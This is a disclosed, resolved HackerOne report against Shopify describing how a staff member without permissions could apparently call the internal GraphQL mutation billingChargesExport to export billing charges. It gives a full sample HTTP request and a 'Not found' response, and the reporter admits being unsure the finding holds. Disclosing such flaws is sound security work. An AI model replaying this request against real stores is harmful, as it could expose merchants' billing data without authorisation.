# [M] Low Privileged Staff Member Can Export Billing Charges

## Summary
Severity: Medium (CVSS 4.3)
Program: Shopify
Weakness: Improper Access Control - Generic
Reporter: ash_nz
State: resolved
Disclosed: 2020-11-26T20:23:41.366Z
Source: https://hackerone.com/reports/1010835

## Details
## Details
I'm not 100% sure about this because i don't have billing transactions on my account. However, from my experience on how Shopify backend respond, i think this is a valid finding just need confirmation from Shopify's security team.
A GraphQL mutation `billingChargesExport` can be used by a staff member with no permissions to export billing charges. The following is a sample request.

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Host: [YOUR-SHOP].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 303

{"query":"\r\n        \r\nmutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message __typename}__typename}}\r\n","variables":{
"id": "gid://shopify/BillingInvoice/58138130",
"exportFormat":"EXCEL_CSV"
}}
```
The response i've got is the following.

```json

{
    "data": {
        "billingChargesExport": {
            "__typename": "BillingChargesExportPayload", 
            "message": null, 
            "userErrors": [
                {
                    "__typename": "UserError", 
                    "message": "Not found", 
                    "field": null
                }
            ]
        }
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1010835_
